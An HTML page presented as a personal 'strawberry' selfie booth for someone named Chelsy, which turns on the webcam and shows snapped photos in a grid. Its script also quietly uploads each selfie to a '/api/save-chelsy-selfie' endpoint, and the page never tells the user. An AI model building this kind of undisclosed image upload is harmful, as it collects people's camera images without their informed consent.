<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>For Chelsy 🍓</title>
<script src="https://cdn.tailwindcss.com"></script>
<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@500;700&family=Poppins:wght@300;400;500&display=swap" rel="stylesheet">
<style>
body{font-family:'Poppins',sans-serif}
.font-love{font-family:'Playfair Display',serif}
.glass{backdrop-filter:blur(16px); background:rgba(255,255,255,0.85)}
</style>
</head>
<body class="min-h-screen bg-[#ffe4e9] relative overflow-hidden">
<!-- strawberry bg blobs -->
<div class="absolute inset-0 -z-10">
  <div class="absolute w-[500px] h-[500px] bg-[#ff8fa3] rounded-full blur-[110px] opacity-40 -top-20 -left-20"></div>
  <div class="absolute w-[600px] h-[600px] bg-[#ffc2cd] rounded-full blur-[120px] opacity-60 -bottom-20 -right-20"></div>
  <div class="absolute top-20 left-10 text-[28px] opacity-20">🍓</div>
  <div class="absolute top-40 right-12 text-[22px] opacity-20">🍨</div>
  <div class="absolute bottom-32 left-16 text-[24px] opacity-20">🍓</div>
</div>

<div class="max-w-md mx-auto px-6 py-10">
  <div class="text-center mb-7">
    <div class="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-white/80 shadow-sm text-[11px] text-pink-600 mb-3">🍓 strawberry edition</div>
    <h1 class="font-love text-[42px] leading-[0.95] text-zinc-900">Hey,<br><span class="text-[#ff4d6d] italic">Chelsy</span></h1>
    <p class="mt-3 text-[14px] text-zinc-600 leading-relaxed">I don't need a weekend getaway —<br>I got you on my screen.</p>
    <p class="mt-2 text-[11px] tracking-widest text-[#ff4d6d]/70">+ EXTRA STRAWBERRY SCOOPS FOR YOU</p>
  </div>

  <div class="glass rounded-[32px] shadow-[0_20px_60px_-15px_rgba(255,77,109,0.35)] p-3 border border-white">
    <div class="relative rounded-[26px] overflow-hidden bg-black aspect-[4/5]">
      <video id="video" autoplay playsinline class="w-full h-full object-cover"></video>
      <canvas id="canvas" class="hidden"></canvas>
      <div id="flash" class="absolute inset-0 bg-white opacity-0 pointer-events-none transition-opacity duration-200"></div>

      <div class="absolute top-4 left-4 right-4 flex justify-between">
        <div class="bg-black/30 backdrop-blur-md text-white text-[11px] px-3 py-1.5 rounded-full">🍓 LIVE</div>
        <div id="timer" class="bg-white text-zinc-900 text-[11px] px-3 py-1.5 rounded-full font-medium">00:60</div>
      </div>

      <div id="countdownOverlay" class="absolute inset-0 bg-[#ff4d6d]/30 backdrop-blur-[3px] hidden items-center justify-center">
        <div id="countNumber" class="text-white text-[90px] font-love">3</div>
      </div>
    </div>

    <div class="p-5">
      <div class="flex gap-3">
        <button id="startBtn" class="flex-1 h-[56px] bg-zinc-900 text-white rounded-full font-medium text-[15px]">Start Scoops 🍨</button>
        <button id="snapBtn" class="hidden flex-1 h-[56px] bg-[#ff4d6d] text-white rounded-full font-medium text-[15px] shadow-[0_8px_20px_-5px_#ff4d6d]">Scoop 🍓</button>
      </div>
      <p id="status" class="text-center text-[12px] text-zinc-500 mt-3">60 seconds • as many strawberry selfies as you want 🍓</p>
      <div id="previewGrid" class="grid grid-cols-3 gap-2 mt-5 hidden"></div>
    </div>
  </div>

  <p class="text-center text-[11px] text-[#ff4d6d]/50 mt-8 tracking-widest">MADE WITH EXTRA STRAWBERRY • JUST FOR YOU</p>
</div>

<script>
const video=document.getElementById('video'),canvas=document.getElementById('canvas'),startBtn=document.getElementById('startBtn'),snapBtn=document.getElementById('snapBtn'),timerEl=document.getElementById('timer'),statusEl=document.getElementById('status'),previewGrid=document.getElementById('previewGrid'),flash=document.getElementById('flash'),overlay=document.getElementById('countdownOverlay'),countNumber=document.getElementById('countNumber');
let stream,interval,timeLeft=60,running=false;
async function initCam(){stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}}); video.srcObject=stream;} initCam();
startBtn.onclick=async()=>{if(!stream) await initCam(); running=true; timeLeft=60; startBtn.classList.add('hidden'); snapBtn.classList.remove('hidden'); previewGrid.classList.remove('hidden'); previewGrid.innerHTML=''; statusEl.textContent='Go! Scoop as many as you can! 🍓'; let c=3; overlay.classList.remove('hidden'); overlay.classList.add('flex'); const cd=setInterval(()=>{countNumber.textContent=c; c--; if(c<0){clearInterval(cd); overlay.classList.add('hidden'); overlay.classList.remove('flex'); startTimer();}},700);};
function startTimer(){interval=setInterval(()=>{timeLeft--; timerEl.textContent=`00:${String(timeLeft).padStart(2,'0')}`; if(timeLeft<=0){clearInterval(interval); running=false; snapBtn.classList.add('hidden'); startBtn.classList.remove('hidden'); startBtn.textContent='More scoops? 🍨'; statusEl.textContent=`Done! ${previewGrid.children.length} strawberry scoops saved 🍓`; timerEl.textContent='00:00';}},1000);}
snapBtn.onclick=()=>{if(!running) return; flash.style.opacity='1'; setTimeout(()=>flash.style.opacity='0',150); canvas.width=video.videoWidth; canvas.height=video.videoHeight; canvas.getContext('2d').drawImage(video,0,0); const data=canvas.toDataURL('image/jpeg',0.85); const img=document.createElement('img'); img.src=data; img.className='w-full aspect-square object-cover rounded-[14px] border-2 border-white'; previewGrid.prepend(img); fetch('/api/save-chelsy-selfie',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({image:data})});};
</script>
</body>
</html>
